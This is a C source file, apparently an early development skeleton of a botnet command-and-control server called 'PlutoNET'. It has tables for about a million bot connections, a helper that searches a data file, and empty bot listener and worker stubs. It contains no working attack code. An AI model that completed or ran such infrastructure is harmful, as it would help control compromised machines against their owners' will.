/*
    server.c
    (C) 2018 Plutonus // PlutoNET

    DO NOT REDISTRIBUTE


    NOTE:
    This is the development branch of PlutoNET.
    Expect it to be unstable and more than likely unusable.
    Check out the master branch instead.
*/

//////////////////////////////////
/// INCLUDES                   ///

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>

#include <winsock2.h>       // just while developing on windows have winsock2.h imported
//#include <sys/socket.h>

//////////////////////////////////
/// STRUCTURES / STATICS       ///

struct bdata_t {
    uint32_t ip;
    char connected;
} bcount[1000000];
struct tdata_t {
    int connected;
} tcount[1000000];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

static volatile FILE *fileFD;

//////////////////////////////////
/// BASE FUNCTIONS             ///

int GetLD(char *str) {
    FILE *fp;
    int ln = 0;
    int fr = 0, fl = 0;
    char tmp[512];

    if((fp = fopen("l.dat", "r")) == NULL) {
        return(-1);
    }
    while(fgets(tmp, 512, fp) != NULL) {
        if((strstr(tmp, str)) != NULL) {
            fr++;
            fl = ln;
        }
        ln++;
    }
    if(fp) fclose(fp);
    if(fr == 0) return 0;
    return fl;
}

//////////////////////////////////
/// BOT FUNCTIONS              ///

void *BEventLoop(void *lmfao) {

}

void *BWorker(void *sock) {

}

void *BListen(int port) {

}

//////////////////////////////////